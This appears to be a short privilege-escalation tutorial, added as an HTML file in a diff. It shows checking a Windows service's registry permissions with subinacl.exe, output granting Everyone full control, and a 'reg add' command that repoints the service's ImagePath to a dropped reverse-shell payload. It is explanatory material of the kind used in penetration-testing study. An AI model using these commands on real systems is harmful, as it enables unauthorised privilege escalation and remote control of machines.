@@ -1,0 +1,33 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>RegKey Imagepath Hijack</title>
+</head><body>In Windows, information related to services is stored in HKLM\SYSTEM\CurrentControlSet\Services registry key. If we want to see information about our “Vulnerable Service” we should check <br/>
+HKLM\SYSTEM\ControlSet001\Services\Vulnerable Service key.<br/>
+<br/>
+You can use <a href="https://www.microsoft.com/en-us/download/details.aspx?id=23510">SubInACL</a>&nbsp;tool to check registry keys permissions. You can download it <a href="https://www.microsoft.com/en-us/download/details.aspx?id=23510">here</a>&nbsp;but the point you need to be aware of it deployed as an msi file. <br/>
+<br/>
+I recommend you to install it a virtual machine and find subinacl.exe file in C:\Program Files (x86)\Windows Resource Kits\Tools\. It will work smoothly without having to install msi package.<br/>
+<br/>
+subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display<br/>
+<br/>
+=========================================================================<br/>
++KeyReg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service<br/>
+=========================================================================<br/>
+/control=0x400 SE_DACL_AUTO_INHERITED-0x0400 <br/>
+/owner &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; =builtin\administrators<br/>
+/primary group &nbsp; &nbsp; =system<br/>
+/perm. ace count &nbsp; =10<br/>
+/pace =everyone &nbsp; ACCESS_ALLOWED_ACE_TYPE-0x0<br/>
+&nbsp; CONTAINER_INHERIT_ACE-0x2 &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; <b>Key and SubKey - Type of Access:<br/>
+</b><b>&nbsp; Full Control</b><br/>
+&nbsp; &nbsp; Detailed Access Flags :<br/>
+&nbsp; KEY_QUERY_VALUE-0x1 &nbsp; &nbsp; &nbsp; &nbsp;KEY_SET_VALUE-0x2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;KEY_CREATE_SUB_KEY-0x4 &nbsp; &nbsp; <br/>
+&nbsp; KEY_ENUMERATE_SUB_KEYS-0x8 KEY_NOTIFY-0x10 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;KEY_CREATE_LINK-0x20 &nbsp; &nbsp; &nbsp; DELETE-0x10000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; READ_CONTROL-0x20000 &nbsp; &nbsp; &nbsp; WRITE_DAC-0x40000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;WRITE_OWNER-0x80000 <br/>
+<br/>
+If we generate a simple reverse shell payload and drop it to our target, all that remains is changing the ImagePath value for our vulnerable service with our payload’s path.<br/>
+<br/>
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f</body></html>
